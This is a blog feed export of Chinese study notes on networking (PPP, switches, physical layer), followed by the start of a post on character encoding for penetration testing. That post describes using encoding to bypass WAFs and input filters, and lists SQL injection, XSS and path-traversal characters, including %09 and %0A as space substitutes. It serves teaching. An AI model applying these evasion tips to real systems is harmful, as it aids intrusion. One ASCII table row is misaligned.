<li>帧控制字段<ul>
<li>类型字段和子类型字段</li>
<li>控制帧（RTS、CTS、ACK等）</li>
<li>数据帧</li>
<li>管理帧</li>
</ul>
</li>
<li>持续期字段<ul>
<li>用于信道预约时间</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-7-广域网"><a href="#3-7-广域网" class="headerlink" title="3.7   广域网"></a>3.7   广域网</h2><h3 id="3-7-1-广域网的基本概念"><a href="#3-7-1-广域网的基本概念" class="headerlink" title="3.7.1   广域网的基本概念"></a>3.7.1   广域网的基本概念</h3><ul>
<li>广域网定义<ul>
<li>英文缩写: WAN (Wide Area Network)</li>
<li>覆盖范围: 远超一个城市的长距离网络</li>
<li>主要任务: 长距离运送主机发送的数据</li>
</ul>
</li>
<li>广域网特点<ul>
<li>节点间连接: 高速链路</li>
<li>首要考虑: 通信容量必须足够大</li>
</ul>
</li>
<li>广域网与互联网的关系<ul>
<li>区别: 广域网≠互联网</li>
<li>互联网特点: 可以连接不同类型网络，使用路由器连接</li>
<li>连接方式: 局域网通过路由器与广域网相连</li>
</ul>
</li>
<li>广域网组成<ul>
<li>主要设备: 节点交换机(非路由器)<ul>
<li>功能: 存储并转发分组</li>
<li>与路由器区别: 在单个网络中转发分组</li>
</ul>
</li>
<li>连接方式: 点到点连接</li>
<li>可靠性设计: 一个节点交换机通常连接多个节点交换机</li>
</ul>
</li>
<li>数据链路层协议发展<ul>
<li>历史协议: HDLC(高级数据链路控制)<ul>
<li>适用环境: 通信线路质量较差年代</li>
</ul>
</li>
<li>当前主流协议: 点对点协议(PPP)<ul>
<li>适用环境: 误码率低的有线链路</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-7-2-PPP-协议"><a href="#3-7-2-PPP-协议" class="headerlink" title="3.7.2    PPP 协议"></a>3.7.2    PPP 协议</h3><ul>
<li>应用场景<ul>
<li>用户计算机与ISP通信</li>
<li>网络设备间直连专用线路</li>
</ul>
</li>
<li>组成部分<ul>
<li>链路控制协议(LCP)<ul>
<li>功能：建立&#x2F;配置&#x2F;测试数据链路连接</li>
</ul>
</li>
<li>网络控制协议(NCP)<ul>
<li>功能：为不同网络层协议建立逻辑连接</li>
</ul>
</li>
<li>IP数据报封装方法<ul>
<li>受MTU限制</li>
</ul>
</li>
</ul>
</li>
<li>帧格式<ul>
<li>首部(4字段)<ul>
<li>标志字段(F): 0x7E(定界符)</li>
<li>地址字段(A): 0xFF</li>
<li>控制字段(C): 0x03</li>
<li>协议字段(2字节)<ul>
<li>0x0021: IP数据报</li>
<li>0xC021: LCP数据</li>
</ul>
</li>
</ul>
</li>
<li>信息段(0-1500字节)</li>
<li>尾部(2字段)<ul>
<li>帧检验序列(FCS): 2字节CRC</li>
<li>标志字段(F): 0x7E</li>
</ul>
</li>
</ul>
</li>
<li>透明传输实现<ul>
<li>异步传输: 字节填充法(转义字符0x7D)</li>
<li>同步传输: 零比特填充法</li>
</ul>
</li>
<li>工作流程(用户拨号示例)<ul>
<li>①. 链路静止状态</li>
<li>②. 物理连接建立→链路建立状态</li>
<li>③. LCP协商配置选项<ul>
<li>成功→鉴别状态</li>
<li>失败→链路静止</li>
</ul>
</li>
<li>④. 身份鉴别<ul>
<li>成功→网络层协议状态</li>
<li>失败→链路终止</li>
</ul>
</li>
<li>⑤. NCP配置网络层→链路打开状态</li>
<li>⑥. 终止流程<ul>
<li>主动终止</li>
<li>故障终止</li>
</ul>
</li>
</ul>
</li>
<li>特点<ul>
<li>①. 无序号确认机制(不可靠服务)</li>
<li>②. 仅支持全双工点对点</li>
<li>③. 支持两端不同网络层协议</li>
<li>④. 面向字节(帧长为整数字节)</li>
</ul>
</li>
</ul>
<h2 id="3-8-数据链路层设备"><a href="#3-8-数据链路层设备" class="headerlink" title="3.8   数据链路层设备"></a>3.8   数据链路层设备</h2><h3 id="3-8-2-以太网交换机"><a href="#3-8-2-以太网交换机" class="headerlink" title="3.8.2    以太网交换机"></a>3.8.2    以太网交换机</h3><ul>
<li>①. 交换机的原理和特点<ul>
<li>以太网交换机也称二层交换机，工作在数据链路层</li>
<li>实质是多接口的网桥，将网络分成小的冲突域</li>
<li>优点：总容量为N×10Mb&#x2F;s（N个接口）</li>
<li>以太网交换机的特点：<ul>
<li><ol>
<li>接口直接连接主机或交换机时工作在全双工方式</li>
</ol>
</li>
<li><ol start="2">
<li>具有并行性，能同时连通多对接口</li>
</ol>
</li>
<li><ol start="3">
<li>接口连接集线器时使用CSMA&#x2F;CD协议且工作在半双工方式</li>
</ol>
</li>
<li><ol start="4">
<li>即插即用设备，帧转发表通过自学习算法建立</li>
</ol>
</li>
<li><ol start="5">
<li>使用专用交换结构芯片，交换速率较高</li>
</ol>
</li>
</ul>
</li>
<li>交换模式：<ul>
<li>直通交换方式<ul>
<li>优点：转发时延小</li>
<li>缺点：不检查差错</li>
</ul>
</li>
<li>存储转发交换方式<ul>
<li>优点：可靠性高，支持不同速率接口转换</li>
<li>缺点：时延较大</li>
</ul>
</li>
</ul>
</li>
<li>具有多种速率接口（10Mb&#x2F;s、100Mb&#x2F;s等）</li>
</ul>
</li>
<li>②. 交换机的自学习功能<ul>
<li>过滤和转发借助交换表完成</li>
<li>交换表表项包含：<ul>
<li><ol>
<li>MAC地址</li>
</ol>
</li>
<li><ol start="2">
<li>连通该MAC地址的接口</li>
</ol>
</li>
</ul>
</li>
<li>自学习过程：<ul>
<li>收到帧后查找交换表</li>
<li>若找不到目的MAC地址则广播</li>
<li>将源地址和接口写入交换表</li>
</ul>
</li>
<li>表项设有有效时间，过期自动删除</li>
</ul>
</li>
<li>③. 共享式以太网和交换式以太网的对比<ul>
<li>主机发送普通帧：<ul>
<li>共享式：集线器转发到所有接口</li>
<li>交换式：交换机根据目的MAC地址转发</li>
</ul>
</li>
<li>主机发送广播帧：<ul>
<li>共享式：集线器转发到所有接口</li>
<li>交换式：交换机转发到所有接口</li>
</ul>
</li>
<li>多对主机同时通信：<ul>
<li>共享式：产生冲突</li>
<li>交换式：不会产生冲突</li>
</ul>
</li>
<li>集线器和交换机的区别：<ul>
<li>集线器：不隔离广播域和冲突域</li>
<li>交换机：不隔离广播域，隔离冲突域</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>数据链路层</tag>
      </tags>
  </entry>
  <entry>
    <title>第 2 章 物理层</title>
    <url>/2025/12/05/%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<h2 id="2-1-通信基础"><a href="#2-1-通信基础" class="headerlink" title="2.1   通信基础"></a>2.1   通信基础</h2><h3 id="2-1-1-基本概念"><a href="#2-1-1-基本概念" class="headerlink" title="2.1.1   基本概念"></a>2.1.1   基本概念</h3><ul>
<li>①. 数据、信号与码元<ul>
<li>通信目的：传输信息（文字、图像、视频等）</li>
<li>数据：传送信息的实体</li>
<li>信号：数据的电气或电磁表现</li>
<li>分类：<ul>
<li>模拟数据&#x2F;信号：取值连续</li>
<li>数字数据&#x2F;信号：取值离散</li>
</ul>
</li>
<li>码元：<ul>
<li>定义：固定时长的信号波形表示k进制数</li>
<li>码元宽度：信号周期</li>
<li>信息量：1码元可携带若干比特</li>
</ul>
</li>
</ul>
</li>
<li>②. 信源、信道与信宿<ul>
<li>通信系统模型：<ul>
<li>信源：产生和发送数据的源头</li>
<li>信道：信号的传输介质<ul>
<li>分类：<ul>
<li>按信号形式：模拟信道、数字信道</li>
<li>按传输介质：无线信道、有线信道</li>
</ul>
</li>
<li>信号类型：<ul>
<li>基带信号：未调制的原始电信号</li>
<li>宽带信号：调制后的频分复用模拟信号</li>
</ul>
</li>
</ul>
</li>
<li>信宿：接收数据的终点</li>
</ul>
</li>
<li>数据传输方式：<ul>
<li>串行传输：逐比特按序传输（长距离）</li>
<li>并行传输：多比特同时传输（近距离）</li>
</ul>
</li>
<li>通信交互方式：<ul>
<li>单向通信：单方向（广播）</li>
<li>半双工通信：双向但不能同时</li>
<li>全双工通信：双向同时</li>
</ul>
</li>
</ul>
</li>
<li>③. 速率、波特与带宽<ul>
<li>速率：<ul>
<li>码元传输速率（波特率）：每秒传输码元数（Baud）</li>
<li>信息传输速率（比特率）：每秒传输比特数（b&#x2F;s）</li>
<li>关系：比特率 &#x3D; 波特率 × n（n为每码元比特数）</li>
</ul>
</li>
<li>带宽：<ul>
<li>模拟系统：频率范围（Hz）</li>
<li>计算机网络：最高数据率（b&#x2F;s）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-1-2-信道的极限容量"><a href="#2-1-2-信道的极限容量" class="headerlink" title="2.1.2    信道的极限容量"></a>2.1.2    信道的极限容量</h3><ul>
<li>信道失真影响<ul>
<li>失真不影响通信质量的条件</li>
<li>导致严重失真的因素<ul>
<li>码元传输速率高</li>
<li>信号传输距离远</li>
<li>噪声干扰大</li>
<li>传输介质质量差</li>
</ul>
</li>
</ul>
</li>
<li>奈奎斯特定理(奈氏准则)<ul>
<li>适用场景: 理想低通(无噪声、带宽有限)信道</li>
<li>核心公式: 极限数据传输速率&#x3D;2Wlog₂V (b&#x2F;s)</li>
<li>关键参数<ul>
<li>W: 信道频率带宽(Hz)</li>
<li>V: 码元离散电平数量</li>
</ul>
</li>
<li>重要结论<br>①. 码元传输速率存在上限<br>②. 带宽越大传输能力越强<br>③. 只限制码元速率不限制信息速率</li>
<li>提高数据速率的方法: 多元制调制</li>
</ul>
</li>
<li>香农定理<ul>
<li>适用场景: 带宽受限且有高斯噪声的信道</li>
<li>核心公式: 极限数据传输速率&#x3D;Wlog₂(1+S&#x2F;N) (b&#x2F;s)</li>
<li>关键参数<ul>
<li>W: 信道频率带宽(Hz)</li>
<li>S: 信号平均功率</li>
<li>N: 高斯噪声功率</li>
</ul>
</li>
<li>信噪比表示方法<ul>
<li>无单位记法: S&#x2F;N</li>
<li>分贝记法: 10log₁₀(S&#x2F;N) dB</li>
</ul>
</li>
<li>重要结论<br>①. 带宽&#x2F;信噪比越大速率越高<br>②. 给定条件下速率上限确定<br>③. 低于极限速率可实现无差错传输<br>④. 实际速率远低于理论极限</li>
</ul>
</li>
<li>奈氏准则 vs 香农定理<ul>
<li>奈氏准则: 仅考虑带宽与码元速率</li>
<li>香农定理: 同时考虑带宽和信噪比</li>
<li>共同结论: 单个码元携带比特数有限</li>
</ul>
</li>
</ul>
<h3 id="2-1-3-编码与调制"><a href="#2-1-3-编码与调制" class="headerlink" title="2.1.3   编码与调制"></a>2.1.3   编码与调制</h3><ul>
<li>信号与数据转换<ul>
<li>编码: 数据→数字信号</li>
<li>调制: 数据→模拟信号</li>
</ul>
</li>
<li>数字数据转换方式<ul>
<li>数字发送器→数字信号</li>
<li>调制器→模拟信号</li>
</ul>
</li>
<li>模拟数据转换方式<ul>
<li>PCM编码器→数字信号</li>
<li>放大器调制器→模拟信号</li>
</ul>
</li>
<li>四种编码与调制方式<ul>
<li>数字数据编码为数字信号<ul>
<li>常用编码方式<ul>
<li>归零(RZ)编码<ul>
<li>特点: 码元中间跳变到零电平</li>
<li>优点: 提供自同步机制</li>
<li>缺点: 占用带宽</li>
</ul>
</li>
<li>非归零(NRZ)编码<ul>
<li>特点: 不归零</li>
<li>优点: 编码效率最高</li>
<li>缺点: 需要时钟线同步</li>
</ul>
</li>
<li>反向非归零(NRZI)编码<ul>
<li>特点: 电平跳变表示0,不变表示1</li>
<li>应用: USB 2.0</li>
</ul>
</li>
<li>曼彻斯特编码<ul>
<li>特点: 码元中间电平跳变</li>
<li>应用: 标准以太网</li>
</ul>
</li>
<li>差分曼彻斯特编码<ul>
<li>特点: 码元开始处跳变表示0</li>
<li>优点: 抗干扰能力强</li>
<li>应用: 宽带高速网</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>模拟数据编码为数字信号<ul>
<li>步骤<ul>
<li>采样<ul>
<li>奈奎斯特定理: 采样频率≥2倍最大频率</li>
</ul>
</li>
<li>量化<ul>
<li>电平幅值→离散数字量</li>
</ul>
</li>
<li>编码<ul>
<li>离散整数→二进制编码</li>
</ul>
</li>
</ul>
</li>
<li>应用: PCM编码</li>
</ul>
</li>
<li>数字数据调制为模拟信号<ul>
<li>调制方式<ul>
<li>调幅(AM)&#x2F;幅移键控(ASK)<ul>
<li>特点: 改变振幅表示1和0</li>
<li>缺点: 抗干扰能力差</li>
</ul>
</li>
<li>调频(FM)&#x2F;频移键控(FSK)<ul>
<li>特点: 改变频率表示1和0</li>
<li>优点: 抗干扰能力强</li>
</ul>
</li>
<li>调相(PM)&#x2F;相移键控(PSK)<ul>
<li>特点: 改变相位表示1和0</li>
<li>变种: DPSK(差分相移键控)</li>
</ul>
</li>
<li>正交幅度调制(QAM)<ul>
<li>特点: AM与PM结合</li>
<li>数据传输速率公式: R&#x3D;Blog₂(mn)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>模拟数据调制为模拟信号<ul>
<li>应用<ul>
<li>电话机和本地局交换机</li>
</ul>
</li>
<li>技术: 频分复用(FDM)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-2-传输介质"><a href="#2-2-传输介质" class="headerlink" title="2.2   传输介质"></a>2.2   传输介质</h2><h3 id="2-2-1-双绞线、同轴电缆、光纤与无线传输介质"><a href="#2-2-1-双绞线、同轴电缆、光纤与无线传输介质" class="headerlink" title="2.2.1    双绞线、同轴电缆、光纤与无线传输介质"></a>2.2.1    双绞线、同轴电缆、光纤与无线传输介质</h3><ul>
<li>传输介质分类<ul>
<li>导向传输介质<ul>
<li>铜线或光纤</li>
<li>电磁波沿固体介质传播</li>
</ul>
</li>
<li>非导向传输介质<ul>
<li>自由空间（空气、真空或海水）</li>
<li>无线传输</li>
</ul>
</li>
</ul>
</li>
<li>①. 双绞线<ul>
<li>特点<ul>
<li>最常用传输介质</li>
<li>两根绝缘铜导线绞合</li>
<li>减少电磁干扰</li>
</ul>
</li>
<li>分类<ul>
<li>屏蔽双绞线(STP)</li>
<li>非屏蔽双绞线(UTP)</li>
</ul>
</li>
<li>性能<ul>
<li>价格便宜</li>
<li>模拟&#x2F;数字传输</li>
<li>通信距离：几千米到数十千米</li>
<li>带宽取决于铜线粗细和传输距离</li>
</ul>
</li>
</ul>
</li>
<li>②. 同轴电缆<ul>
<li>结构<ul>
<li>内导体</li>
<li>绝缘层</li>
<li>外导体屏蔽层</li>
<li>绝缘保护套层</li>
</ul>
</li>
<li>分类<ul>
<li>50Ω同轴电缆<ul>
<li>传送基带数字信号</li>
<li>早期局域网应用</li>
</ul>
</li>
<li>75Ω同轴电缆<ul>
<li>传送宽带信号</li>
<li>有线电视系统应用</li>
</ul>
</li>
</ul>
</li>
<li>特点<ul>
<li>良好抗干扰特性</li>
<li>传输较高速率数据</li>
</ul>
</li>
</ul>
</li>
<li>③. 光纤<ul>
<li>原理<ul>
<li>利用光脉冲通信</li>
<li>1：有光脉冲</li>
<li>0：无光脉冲</li>
</ul>
</li>
<li>结构<ul>
<li>纤芯（8-100μm）</li>
<li>包层（较低折射率）</li>
</ul>
</li>
<li>传输原理<ul>
<li>全反射现象</li>
</ul>
</li>
<li>分类<ul>
<li>多模光纤<ul>
<li>多条光线传输</li>
<li>适合近距离</li>
</ul>
</li>
<li>单模光纤<ul>
<li>单波长传输</li>
<li>适合远距离</li>
</ul>
</li>
</ul>
</li>
<li>优点<ul>
<li>通信容量大</li>
<li>传输损耗小</li>
<li>抗干扰性能好</li>
<li>无串音干扰</li>
<li>体积小重量轻</li>
</ul>
</li>
</ul>
</li>
<li>④. 无线传输介质<ul>
<li>应用场景<ul>
<li>蜂窝移动电话</li>
<li>无线局域网(WLAN)</li>
<li>特殊场合移动联网</li>
</ul>
</li>
<li>(1) 无线电波<ul>
<li>特点<ul>
<li>穿透能力强</li>
<li>传输距离长</li>
<li>全向传播</li>
</ul>
</li>
</ul>
</li>
<li>(2) 微波、红外线和激光<ul>
<li>共同特点<ul>
<li>需要视线通路</li>
<li>指向性强</li>
</ul>
</li>
<li>微波通信<ul>
<li>频率：2-40GHz</li>
<li>容量大</li>
<li>直线传播</li>
<li>需中继站</li>
</ul>
</li>
<li>卫星通信<ul>
<li>地球同步卫星中继</li>
<li>优点<ul>
<li>容量大</li>
<li>距离远</li>
<li>覆盖广</li>
</ul>
</li>
<li>缺点<ul>
<li>保密性差</li>
<li>传播时延长</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-2-物理层接口的特性"><a href="#2-2-2-物理层接口的特性" class="headerlink" title="2.2.2    物理层接口的特性"></a>2.2.2    物理层接口的特性</h3><ul>
<li>定义<ul>
<li>在连接各种计算机的传输介质上传输比特流</li>
<li>屏蔽硬件设备和传输介质的差异</li>
</ul>
</li>
<li>主要任务<ul>
<li>确定与传输介质接口有关的特性<ul>
<li>机械特性<ul>
<li>接线器的形状和尺寸</li>
<li>引脚数量和排列</li>
<li>固定和锁定装置</li>
</ul>
</li>
<li>电气特性<ul>
<li>各条线上的电压范围</li>
<li>传输速率</li>
<li>距离限制</li>
</ul>
</li>
<li>功能特性<ul>
<li>电平电压的意义</li>
<li>每条线的功能</li>
</ul>
</li>
<li>过程特性（规程特性）<ul>
<li>不同功能事件的出现顺序</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-3-物理层设备"><a href="#2-3-物理层设备" class="headerlink" title="2.3   物理层设备"></a>2.3   物理层设备</h2><h3 id="2-3-1-中继器"><a href="#2-3-1-中继器" class="headerlink" title="2.3.1    中继器"></a>2.3.1    中继器</h3><ul>
<li>主要功能<ul>
<li>放大、整形并转发信号</li>
<li>消除信号失真和衰减</li>
<li>扩大网络传输距离</li>
</ul>
</li>
<li>工作原理<ul>
<li>信号再生（非简单放大）</li>
<li>双端口设计<ul>
<li>数据从一个端口输入</li>
<li>从另一个端口发出</li>
</ul>
</li>
<li>仅作用于信号电气部分</li>
</ul>
</li>
<li>网络特性<ul>
<li>连接的是网段而非子网</li>
<li>仍属于同一局域网</li>
<li>故障影响<ul>
<li>对相邻两个网段产生影响</li>
</ul>
</li>
</ul>
</li>
<li>使用限制<ul>
<li>理论上数量无限</li>
<li>实际限制因素<ul>
<li>信号延迟范围规定</li>
<li>5-4-3规则示例<ul>
<li>10BASE5以太网规范</li>
<li>最多4个中继器串联</li>
<li>5段介质中3段可接计算机</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>与放大器的区别<ul>
<li>放大器<ul>
<li>放大模拟信号</li>
<li>原理：放大衰减信号</li>
</ul>
</li>
<li>中继器<ul>
<li>放大数字信号</li>
<li>原理：整形再生信号</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-3-2-集线器"><a href="#2-3-2-集线器" class="headerlink" title="2.3.2    集线器"></a>2.3.2    集线器</h3><ul>
<li>定义<ul>
<li>集线器(Hub)实质上是一个多端口的中继器</li>
</ul>
</li>
<li>工作原理<ul>
<li>端口接收数据信号</li>
<li>信号整形放大（再生）</li>
<li>转发到其他所有工作端口（除输入端口外）</li>
<li>多端口输入时会发生冲突导致数据无效</li>
</ul>
</li>
<li>功能特点<ul>
<li>信号放大和转发</li>
<li>扩大网络传输范围</li>
<li>不具备信号定向传送能力</li>
<li>标准的共享式设备</li>
</ul>
</li>
<li>组网特性<ul>
<li>组网灵活</li>
<li>所有节点通信集中在中心节点</li>
<li>组成共享式网络</li>
<li>逻辑上仍是总线网</li>
<li>每个端口连接同一网络的不同网段</li>
<li>只能半双工工作</li>
<li>网络吞吐率受限</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>物理层</tag>
      </tags>
  </entry>
  <entry>
    <title>编码技术</title>
    <url>/2025/12/14/%E7%BC%96%E7%A0%81%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="一、编码基础概述"><a href="#一、编码基础概述" class="headerlink" title="一、编码基础概述"></a>一、编码基础概述</h2><h3 id="1-1-为什么需要编码"><a href="#1-1-为什么需要编码" class="headerlink" title="1.1 为什么需要编码"></a>1.1 为什么需要编码</h3><p>在计算机系统中，不同系统、协议和应用程序对数据的表示和处理方式存在差异。编码技术解决了以下问题：</p>
<ul>
<li><strong>字符表示</strong>：将人类可读的字符转换为计算机可处理的二进制数据</li>
<li><strong>数据传输</strong>：确保特殊字符在传输过程中不被误解或破坏</li>
<li><strong>安全过滤</strong>：绕过基于特定字符集的过滤机制</li>
<li><strong>数据压缩</strong>：在某些情况下提高传输效率</li>
</ul>
<h3 id="1-2-编码与加密的区别"><a href="#1-2-编码与加密的区别" class="headerlink" title="1.2 编码与加密的区别"></a>1.2 编码与加密的区别</h3><ul>
<li><strong>编码</strong>：数据格式的转换，是可逆的、公开的转换过程，不提供保密性</li>
<li><strong>加密</strong>：通过密钥将数据转换为密文，提供保密性和完整性保护</li>
</ul>
<h3 id="1-3-编码在网络安全中的重要性"><a href="#1-3-编码在网络安全中的重要性" class="headerlink" title="1.3 编码在网络安全中的重要性"></a>1.3 编码在网络安全中的重要性</h3><p>渗透测试中，攻击者常利用编码技术：</p>
<ul>
<li>绕过WAF（Web应用防火墙）和输入过滤</li>
<li>隐藏恶意负载</li>
<li>规避安全检测机制</li>
<li>利用解析差异实施攻击</li>
</ul>
<h2 id="二、基础字符编码"><a href="#二、基础字符编码" class="headerlink" title="二、基础字符编码"></a>二、基础字符编码</h2><h3 id="2-1-ASCII编码"><a href="#2-1-ASCII编码" class="headerlink" title="2.1 ASCII编码"></a>2.1 ASCII编码</h3><h4 id="ASCII编码背景"><a href="#ASCII编码背景" class="headerlink" title="ASCII编码背景"></a>ASCII编码背景</h4><ul>
<li><strong>历史</strong>：1963年由美国国家标准协会(ANSI)制定，最初用于电报通信</li>
<li><strong>标准范围</strong>：0-127（7位），共128个字符</li>
<li><strong>扩展ASCII</strong>：8位编码，范围0-255，包含特殊符号和非英语字符</li>
<li><strong>渗透测试意义</strong>：作为大多数现代编码的基础，理解ASCII对于分析编码绕过至关重要</li>
</ul>
<h4 id="完整ASCII表"><a href="#完整ASCII表" class="headerlink" title="完整ASCII表"></a>完整ASCII表</h4><table>
<thead>
<tr>
<th>十进制</th>
<th>十六进制</th>
<th>二进制</th>
<th>字符</th>
<th>名称&#x2F;说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>控制字符 (0-31, 127)</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>0x00</td>
<td>00000000</td>
<td>NUL</td>
<td>空字符 (Null)</td>
</tr>
<tr>
<td>7</td>
<td>0x07</td>
<td>00000111</td>
<td>BEL</td>
<td>响铃 (Bell)</td>
</tr>
<tr>
<td>8</td>
<td>0x08</td>
<td>00001000</td>
<td>BS</td>
<td>退格 (Backspace)</td>
</tr>
<tr>
<td>9</td>
<td>0x09</td>
<td>00001001</td>
<td>HT</td>
<td>水平制表符 (Horizontal Tab)</td>
</tr>
<tr>
<td>10</td>
<td>0x0A</td>
<td>00001010</td>
<td>LF</td>
<td>换行 (Line Feed)</td>
</tr>
<tr>
<td>13</td>
<td>0x0D</td>
<td>00001101</td>
<td>CR</td>
<td>回车 (Carriage Return)</td>
</tr>
<tr>
<td>27</td>
<td>0x1B</td>
<td>00011011</td>
<td>ESC</td>
<td>转义 (Escape)</td>
</tr>
<tr>
<td>127</td>
<td>0x7F</td>
<td>01111111</td>
<td>DEL</td>
<td>删除 (Delete)</td>
</tr>
<tr>
<td><strong>可打印字符 (32-126)</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>0x20</td>
<td>00100000</td>
<td>[空格]</td>
<td>空格 (Space)</td>
</tr>
<tr>
<td>33</td>
<td>0x21</td>
<td>00100001</td>
<td>!</td>
<td>感叹号</td>
</tr>
<tr>
<td>34</td>
<td>0x22</td>
<td>00100010</td>
<td>“</td>
<td>双引号</td>
</tr>
<tr>
<td>39</td>
<td>0x27</td>
<td>00100111</td>
<td>‘</td>
<td>单引号</td>
</tr>
<tr>
<td>40-41</td>
<td>0x28-0x29</td>
<td>00101000-00101001</td>
<td>()</td>
<td>括号</td>
</tr>
<tr>
<td>42</td>
<td>0x2A</td>
<td>00101010</td>
<td>*</td>
<td>星号</td>
</tr>
<tr>
<td>43</td>
<td>0x2B</td>
<td>00101011</td>
<td>+</td>
<td>加号</td>
</tr>
<tr>
<td>44</td>
<td>0x2C</td>
<td>00101100</td>
<td>,</td>
<td>逗号</td>
</tr>
<tr>
<td>45</td>
<td>0x2D</td>
<td>00101101</td>
<td>-</td>
<td>连字符</td>
</tr>
<tr>
<td>46</td>
<td>0x2E</td>
<td>00101110</td>
<td>.</td>
<td>句点</td>
</tr>
<tr>
<td>47</td>
<td>0x2F</td>
<td>00101111</td>
<td>&#x2F;</td>
<td>斜杠</td>
</tr>
<tr>
<td>58-59</td>
<td>0x3A-0x3B</td>
<td>00111010-00111011</td>
<td>:;</td>
<td>冒号、分号</td>
</tr>
<tr>
<td>60-62</td>
<td>0x3C-0x3E</td>
<td>00111100-00111110</td>
<td>&lt;&gt;</td>
<td>小于号、大于号</td>
</tr>
<tr>
<td>63</td>
<td>0x3F</td>
<td>00111111</td>
<td>?</td>
<td>问号</td>
</tr>
<tr>
<td>64</td>
<td>0x40</td>
<td>01000000</td>
<td>@</td>
<td>at符号</td>
</tr>
<tr>
<td>65-90</td>
<td>0x41-0x5A</td>
<td>01000001-01011010</td>
<td>A-Z</td>
<td>大写字母</td>
</tr>
<tr>
<td>91-96</td>
<td>0x5B-0x60</td>
<td>01011011-01100000</td>
<td>[]^_&#96;</td>
<td>特殊符号</td>
</tr>
<tr>
<td>97-122</td>
<td>0x61-0x7A</td>
<td>01100001-01111010</td>
<td>a-z</td>
<td>小写字母</td>
</tr>
<tr>
<td>123-126</td>
<td>0x7B-0x7E</td>
<td>01111011-01111110</td>
<td>{</td>
<td>}~</td>
</tr>
</tbody></table>
<h4 id="渗透测试中的ASCII特殊字符应用"><a href="#渗透测试中的ASCII特殊字符应用" class="headerlink" title="渗透测试中的ASCII特殊字符应用"></a>渗透测试中的ASCII特殊字符应用</h4><ul>
<li><strong>空格(0x20)</strong>：SQL注入中替代空格的常用字符（如<code>%09</code>、<code>%0A</code>）</li>
<li><strong>单引号(0x27)</strong>：SQL注入关键字符，常需编码绕过</li>
<li><strong>双引号(0x22)</strong>：XSS攻击中常用于闭合属性</li>
<li><strong>尖括号(0x3C, 0x3E)</strong>：HTML标签标识符，XSS攻击核心</li>
<li><strong>斜杠(0x2F)</strong>：路径分隔符，目录遍历攻击关键</li>
<li><strong>反斜杠(0x5C)</strong>：在某些语言中作为转义字符</li>
</ul>
<h3 id="2-2-Unicode编码体系"><a href="#2-2-Unicode编码体系" class="headerlink" title="2.2 Unicode编码体系"></a>2.2 Unicode编码体系</h3><ul>
<li><p><strong>UTF-8</strong>：</p>
<ul>
<li>可变长度编码（1-4字节）</li>
<li>向后兼容ASCII</li>
<li>互联网标准（RFC 3629），现代Web应用首选</li>
<li>优势：节省空间（ASCII字符仅需1字节），支持全球语言</li>
</ul>
</li>
<li><p><strong>UTF-16</strong>：</p>
<ul>
<li>固定2字节或可变4字节编码</li>
<li>Windows系统内部常用</li>
<li>BOM（Byte Order Mark）问题可能导致解析异常</li>
</ul>
</li>
<li><p><strong>UTF-32</strong>：</p>
<ul>
<li>固定4字节编码</li>
<li>处理简单但空间效率低</li>
<li>较少用于网络传输</li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>利用不同系统对Unicode解析的差异</li>
<li>BOM头注入绕过文件类型检测</li>
<li>混合编码导致的解析漏洞</li>
</ul>
</li>
</ul>
<h3 id="2-3-ISO-8859系列编码"><a href="#2-3-ISO-8859系列编码" class="headerlink" title="2.3 ISO-8859系列编码"></a>2.3 ISO-8859系列编码</h3><ul>
<li><strong>ISO-8859-1 (Latin-1)</strong>：西欧语言</li>
<li><strong>ISO-8859-2</strong>：中欧语言</li>
<li><strong>ISO-8859-5</strong>：西里尔字母</li>
<li><strong>渗透测试应用</strong>：在未指定编码的Web应用中引发乱码问题，可能导致安全漏洞</li>
</ul>
<h2 id="三、Web相关编码技术"><a href="#三、Web相关编码技术" class="headerlink" title="三、Web相关编码技术"></a>三、Web相关编码技术</h2><h3 id="3-1-页面编码"><a href="#3-1-页面编码" class="headerlink" title="3.1 页面编码"></a>3.1 页面编码</h3><ul>
<li><p><strong>设置方式</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>或HTTP响应头：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>常用编码</strong>：</p>
<ul>
<li>UTF-8：现代Web标准</li>
<li>GBK&#x2F;GB2312：中文环境常用</li>
<li>ISO-8859-1：早期Web应用</li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>利用编码不一致导致的XSS漏洞</li>
<li>混合编码绕过过滤</li>
<li>通过修改响应头欺骗客户端解析</li>
</ul>
</li>
</ul>
<h3 id="3-2-HTML编码"><a href="#3-2-HTML编码" class="headerlink" title="3.2 HTML编码"></a>3.2 HTML编码</h3><ul>
<li><p><strong>命名实体</strong>：<code>&amp;nbsp;</code>、<code>&amp;lt;</code>、<code>&amp;gt;</code>等</p>
</li>
